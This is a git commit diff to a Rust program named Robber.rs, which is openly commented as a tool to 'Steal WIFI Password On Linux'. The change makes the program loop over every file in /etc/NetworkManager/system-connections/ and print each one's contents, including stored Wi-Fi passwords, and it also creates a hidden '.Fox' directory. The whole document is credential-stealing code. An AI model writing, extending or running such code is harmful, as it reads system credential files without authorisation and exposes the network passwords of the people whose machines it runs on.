4a467bce2345fe069b674a27c5d242a0714c0eed
Mr-Fox-h <mr.fox@iran.ir>
2022-02-15 06:44:50 -1100

    52 commit

--- Linux/Robber.rs
+++ Linux/Robber.rs
@@ -1,13 +1,18 @@
+use std::fs;
 use std::fs::File;
 use std::io::prelude::*;
 
 fn main() {
-    println!("{}", steal_wifi_pas());
+    let paths = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();
+    fs::create_dir_all(".Fox").expect("Error! File Exist.\n");
+    for index in paths {
+        println!("{}", steal_wifi_pas(index.unwrap().path().display().to_string()));
+    }
 }
 
 //Steal WIFI Password On Linux
-fn steal_wifi_pas() -> String {
-    let mut files = File::open("/etc/NetworkManager/system-connections/3boys").expect("Error! No File.\n");
+fn steal_wifi_pas(source: String) -> String {
+    let mut files = File::open(&source).expect("Error! No File.\n");
     let mut context: String = String::new();
     files.read_to_string(&mut context).expect("Error! Not readable.\n");
     return context;
